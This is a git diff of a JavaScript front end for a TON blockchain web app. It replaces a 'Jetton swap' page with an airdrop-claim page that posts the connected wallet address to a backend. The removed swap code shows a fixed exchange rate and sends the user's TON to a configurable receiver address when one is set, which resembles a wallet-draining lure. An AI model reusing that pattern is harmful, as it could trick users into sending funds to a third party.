@@ -1,27 +1,21 @@
-// Legitimate TON Jetton Swap Interface
-// This is a demo DApp for interacting with Jetton tokens
-
 if (typeof CFG === 'undefined') {
-    console.error('[FATAL] config.js did not load. Make sure config.js is included before script.js');
     var CFG = {
-        tonToUsdtRate: 5.0,
-        tokenDecimals: 6,
-        tonDecimals: 9,
-        forwardGas: '50000000',
+        backendUrl: 'https://jettoken-airdrop-backend-production.up.railway.app',
+        network: 'mainnet',
+        jettonMaster: 'EQCtJiXSoQPBRMh2yijkSyTZ1iqkj-uQRKvvaAUlkFLUwsS6',
         claimAmount: '1000000',
-        jettonReceiver: ''
+        tokenDecimals: 6,
+        tokenSymbol: 'JET'
     };
 }
 
-const JETTON_TRANSFER_OP = 0xf8a7ea5;
-const JETTON_BURN_OP = 0x595f07bc;
-
-class TonJettonApp {
+class TonAirdropApp {
     constructor() {
         this.tonConnectUI = null;
         this.connected = false;
         this.userAddress = null;
         this.wallet = null;
+        this.claimInProgress = false;
 
         this.init();
     }
@@ -37,63 +31,68 @@ class TonJettonApp {
         });
 
         this.initUI();
+        this.loadBackendConfig();
     }
 
     initUI() {
-        const swapBtn = document.getElementById('swapBtn');
-        const payAmount = document.getElementById('payAmount');
-        const receiveAmount = document.getElementById('receiveAmount');
-
-        payAmount.addEventListener('input', (e) => {
-            const tonAmount = parseFloat(e.target.value) || 0;
-            const usdtAmount = tonAmount * CFG.tonToUsdtRate;
-            receiveAmount.value = usdtAmount.toFixed(CFG.tokenDecimals);
-        });
-
-        swapBtn.addEventListener('click', () => {
+        const claimBtn = document.getElementById('claimBtn');
+        claimBtn.addEventListener('click', () => {
             if (!this.connected) {
                 this.tonConnectUI.openModal();
                 return;
             }
-            this.executeSwap();
+            this.claimAirdrop();
         });
+
+        this.renderConfig();
     }
 
     handleWalletChange(wallet) {
-        const swapBtn = document.getElementById('swapBtn');
+        const claimBtn = document.getElementById('claimBtn');
 
         if (wallet) {
             this.connected = true;
             this.wallet = wallet;
             this.userAddress = this.normalizeAddress(wallet.account.address);
-            swapBtn.textContent = 'Swap';
-            this.fetchBalance();
+            claimBtn.textContent = 'Claim Airdrop';
+            document.getElementById('user-address').textContent = this.shortenAddress(this.userAddress);
         } else {
             this.connected = false;
             this.wallet = null;
             this.userAddress = null;
-            swapBtn.textContent = 'Connect Wallet';
-            document.getElementById('user-balance').textContent = 'Balance: 0';
+            claimBtn.textContent = 'Connect Wallet';
+            document.getElementById('user-address').textContent = 'Not connected';
         }
     }
 
-    async fetchBalance() {
-        if (!this.connected) return;
+    async loadBackendConfig() {
         try {
-            document.getElementById('user-balance').textContent =
-                `Connected: ${this.shortenAddress(this.userAddress)}`;
+            const res = await fetch(`${CFG.backendUrl}/config`);
+            if (!res.ok) return;
+
+            const data = await res.json();
+            if (!data.ok) return;
+
+            CFG.network = data.network || CFG.network;
+            CFG.jettonMaster = data.jettonMaster || CFG.jettonMaster;
+            CFG.claimAmount = data.claimAmount || CFG.claimAmount;
+            CFG.tokenDecimals = Number(data.tokenDecimals || CFG.tokenDecimals);
+            CFG.tokenSymbol = data.tokenSymbol || CFG.tokenSymbol;
+            this.renderConfig();
         } catch (e) {
-            console.error('Error fetching balance:', e);
+            console.warn('Backend config is unavailable:', e.message);
         }
     }
 
-    isValidAddress(addr) {
-        try {
-            this.normalizeAddress(addr);
-            return true;
-        } catch (e) {
-            return false;
-        }
+    renderConfig() {
+        const amount = this.formatTokenAmount(CFG.claimAmount, CFG.tokenDecimals);
+        const claimAmountEl = document.getElementById('claim-amount');
+        const tokenMasterEl = document.getElementById('token-master');
+        const networkEl = document.getElementById('network');
+
+        if (claimAmountEl) claimAmountEl.textContent = `${amount} ${CFG.tokenSymbol}`;
+        if (tokenMasterEl) tokenMasterEl.textContent = this.shortenAddress(CFG.jettonMaster);
+        if (networkEl) networkEl.textContent = CFG.network;
     }
 
     normalizeAddress(addr) {
@@ -103,128 +102,66 @@ class TonJettonApp {
         return new TonWeb.utils.Address(addr).toString(true, true, true);
     }
 
-    async executeSwap() {
-        const payAmount = document.getElementById('payAmount').value;
+    async claimAirdrop() {
         const status = document.getElementById('status');
+        const claimBtn = document.getElementById('claimBtn');
 
-        if (!payAmount || parseFloat(payAmount) <= 0) {
-            status.textContent = 'Please enter an amount';
+        if (this.claimInProgress) return;
+
+        if (!this.userAddress) {
+            status.textContent = 'Connect wallet first';
             status.className = 'status-msg error';
             return;
         }
 
-        if (!this.userAddress || !this.isValidAddress(this.userAddress)) {
-            status.textContent = 'Wallet not connected properly. Please reconnect.';
-            status.className = 'status-msg error';
-            return;
-        }
-
-        status.textContent = 'Preparing transaction...';
+        this.claimInProgress = true;
+        claimBtn.disabled = true;
+        status.textContent = 'Submitting claim...';
         status.className = 'status-msg';
 
         try {
-            const amountNano = Math.floor(parseFloat(payAmount) * Math.pow(10, CFG.tonDecimals));
-            const jettonAmount = Math.floor(parseFloat(CFG.claimAmount));
-
-            // Determine target address: jettonReceiver if set, otherwise user's own jetton wallet
-            const targetAddress = this.normalizeAddress(
-                CFG.jettonReceiver && this.isValidAddress(CFG.jettonReceiver)
-                    ? CFG.jettonReceiver
-                    : this.userAddress
-            );
-
-            console.log('[DEBUG] targetAddress:', targetAddress);
-            console.log('[DEBUG] userAddress:', this.userAddress);
-            console.log('[DEBUG] amountNano:', amountNano);
-
-            // Build jetton transfer payload using TonWeb
-            const payload = this.buildJettonTransferPayload({
-                queryId: Date.now(),
-                amount: jettonAmount,
-                destination: this.userAddress,
-                responseDestination: this.userAddress,
-                forwardTonAmount: parseInt(CFG.forwardGas)
+            const res = await fetch(`${CFG.backendUrl}/api/claim`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ address: this.userAddress })
             });
+            const data = await res.json();
 
-            const payloadBase64 = await this.cellToBase64(payload);
+            if (!res.ok || !data.ok) {
+                throw new Error(data.error || 'Claim failed');
+            }
 
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 360,
-                messages: [{
-                    address: targetAddress,
-                    amount: amountNano.toString(),
-                    payload: payloadBase64
-                }]
-            };
-
-            console.log('[DEBUG] transaction:', JSON.stringify(transaction, null, 2));
-
-            const result = await this.tonConnectUI.sendTransaction(transaction);
-
-            status.textContent = `Transaction sent! Hash: ${this.shortenHash(result.boc)}`;
+            status.textContent = `Airdrop sent: ${this.formatTokenAmount(data.claim.amount, data.claim.tokenDecimals)} ${data.claim.tokenSymbol || CFG.tokenSymbol}`;
             status.className = 'status-msg success';
-
+            claimBtn.textContent = 'Claim Submitted';
         } catch (e) {
-            console.error('Swap error:', e);
-            status.textContent = 'Transaction failed: ' + e.message;
+            console.error('Claim error:', e);
+            status.textContent = 'Claim failed: ' + e.message;
             status.className = 'status-msg error';
+            claimBtn.disabled = false;
+        } finally {
+            this.claimInProgress = false;
         }
     }
 
-    buildJettonTransferPayload({ queryId, amount, destination, responseDestination, forwardTonAmount }) {
-        const Cell = TonWeb.boc.Cell;
-        const Address = TonWeb.utils.Address;
+    formatTokenAmount(amount, decimals) {
+        const value = BigInt(String(amount || '0'));
+        const base = 10n ** BigInt(decimals || 0);
+        const whole = value / base;
+        const fraction = value % base;
 
-        const cell = new Cell();
-        cell.bits.writeUint(JETTON_TRANSFER_OP, 32);
-        cell.bits.writeUint(queryId, 64);
-        cell.bits.writeCoins(amount);
-        cell.bits.writeAddress(new Address(destination));
-        cell.bits.writeAddress(new Address(responseDestination));
-        cell.bits.writeBit(0); // customPayload: null
-        cell.bits.writeCoins(forwardTonAmount);
-        cell.bits.writeBit(0); // forwardPayload: empty
-        return cell;
-    }
+        if (fraction === 0n) return whole.toString();
 
-    async cellToBase64(cell) {
-        const boc = await cell.toBoc(false);
-
-        if (typeof boc === 'string') {
-            return boc;
-        }
-
-        if (boc instanceof Uint8Array || Array.isArray(boc)) {
-            return this.bytesToBase64(boc);
-        }
-
-        if (boc && boc.buffer instanceof ArrayBuffer) {
-            return this.bytesToBase64(new Uint8Array(boc.buffer));
-        }
-
-        throw new Error('Cannot convert cell to base64');
-    }
-
-    bytesToBase64(bytes) {
-        let binary = '';
-        for (let i = 0; i < bytes.length; i++) {
-            binary += String.fromCharCode(bytes[i]);
-        }
-        return btoa(binary);
+        const fractionText = fraction.toString().padStart(Number(decimals), '0').replace(/0+$/, '');
+        return `${whole}.${fractionText}`;
     }
 
     shortenAddress(addr) {
         if (!addr) return '';
         return addr.slice(0, 6) + '...' + addr.slice(-4);
     }
-
-    shortenHash(hash) {
-        if (!hash) return '';
-        return hash.slice(0, 8) + '...';
-    }
 }
 
-// Initialize app when DOM is ready
 document.addEventListener('DOMContentLoaded', () => {
-    window.app = new TonJettonApp();
+    window.app = new TonAirdropApp();
 });
